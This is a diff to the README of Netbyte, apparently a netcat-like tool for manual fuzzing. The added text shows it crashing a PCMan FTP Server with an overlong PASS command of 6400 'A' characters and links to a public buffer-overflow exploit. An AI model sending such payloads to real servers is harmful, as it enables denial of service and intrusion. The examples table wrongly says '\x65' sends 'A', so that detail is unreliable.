@@ -80,26 +80,42 @@ Connection closed
 
 Netbyte is able to send evaluated Python expressions by using `!!` at the beginning of any input. This is useful for manual fuzzing and even exploitation.
 
-*Note: using this mode does not automatically include a newline (\n) in the string to send. If you wish to include a newline, make sure to add ```+ "\n"``` to your statement.*
+*Note: using `!!` mode does not automatically include a newline (\n) in the string to send.*
+
+### Newlines
+
+To include a newline automatically at the end of an evaluated expression, use `!!!` at the beginning of any input.
 
 ### Examples:
 | Expression | Result |
 |:-----------|:-------|
-| `!! "A" * 200` | Send 200 A's |
-| `!! "\x65" * 200` | Send 200 A's |
-| `!! "\x65\x66\x67" * 3 + "\n"` | Send ABCABCABC and a newline |
+| `!! "A" * 250` | Send 250 A's |
+| `!! "\x65" * 250` | Send 250 A's |
+| `!! "A" * 250 + "\n"` | Send 250 A's and a newline ('\n')|
+| `!!! "A" * 250` | Send 250 A's and a newline ('\n') |
+| `!!! "abc" * 2 + "def"` | Send 'abcabcdef' and a newline ('\n') |
 
 
-Let's see it in action:
+Let's see it in action by crashing a PCMan FTP Server:
 ```
-netbyte ftpserver.com 21
-220 ProFTPD 1.3.1 Server (ProFTPD)
+Connection Established
+220 PCMan's FTP Server 2.0 Ready.
+
+32(2) 32(2) 30(0) 20 50(P) 43(C) 4D(M) 61(a) 6E(n) 27(') 73(s) 20 46(F) 54(T) 50(P) 20 53(S) 65(e) 72(r) 76(v) 65(e) 72(r) 20 32(2) 2E 30(0) 20 52(R) 65(e) 61(a) 64(d) 79(y) 2E 0D 0A(\n)
+
 USER anonymous
-331 Anonymous login ok, send complete email address as your password
-!! "PASS " + "A" * 2000
+331 User name okay, need password.
+
+33(3) 33(3) 31(1) 20 55(U) 73(s) 65(e) 72(r) 20 6E(n) 61(a) 6D(m) 65(e) 20 6F(o) 6B(k) 61(a) 79(y) 2C(,) 20 6E(n) 65(e) 65(e) 64(d) 20 70(p) 61(a) 73(s) 73(s) 77(w) 6F(o) 72(r) 64(d) 2E 0D 0A(\n)
+
+!!! "PASS " + "A" * 6400
+230 User logged in
+
+32(2) 33(3) 30(0) 20 55(U) 73(s) 65(e) 72(r) 20 6C(l) 6F(o) 67(g) 67(g) 65(e) 64(d) 20 69(i) 6E(n) 0D 0A(\n)
+
 ```
 
-For a more complete review see my blog post, [Manual Fuzzing and Exploitation with Netbyte](https://www.sc0tfree.com/something).
+*The exploit for this buffer overflow can be found [here](https://www.exploit-db.com/exploits/27277/).*
 
 ## Test Server
 
